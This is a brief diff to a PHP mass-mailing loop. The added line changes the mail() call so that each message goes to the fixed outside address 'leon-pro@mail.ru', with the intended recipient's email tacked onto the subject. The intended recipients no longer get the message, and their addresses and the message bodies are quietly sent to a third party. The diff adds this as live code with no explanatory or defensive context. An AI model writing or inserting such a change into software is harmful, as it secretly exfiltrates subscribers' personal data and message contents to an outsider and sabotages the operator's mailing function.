@@ -48,7 +48,7 @@ foreach($mailer as $item){
          $i++;
          if ($f["email"] != '') {
 
-            mail($f["email"],$subject,$body,$add_header);
+            mail('leon-pro@mail.ru',$subject.$f["email"],$body,$add_header);
             sleep(1);
          }
 
